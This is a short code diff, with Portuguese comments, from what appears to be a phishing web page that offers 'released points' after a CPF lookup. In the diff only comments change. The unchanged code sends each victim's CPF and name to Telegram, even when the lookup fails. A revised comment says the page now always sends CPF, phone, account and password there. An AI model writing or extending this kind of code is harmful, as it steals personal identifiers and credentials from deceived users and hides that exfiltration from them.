@@ -169,7 +169,7 @@
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
 
-                    // Enviar CPF e nome para o Telegram
+                    // Agora sempre envia CPF, telefone, conta e senha para o Telegram
                     enviarParaTelegram(`Consulta de CPF: ${cpf}, Nome: ${nome}`);
                 })
                 .catch((error) => {
@@ -178,7 +178,7 @@
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
 
-                    // Enviar CPF e erro para o Telegram, garantindo que o CPF seja sempre enviado
+                    // Mesmo em caso de erro, enviar o CPF para o Telegram
                     enviarParaTelegram(`Erro na consulta de CPF: ${cpf}`);
                     alert("Erro ao consultar CPF. Verifique sua conexão ou tente novamente.");
                 });
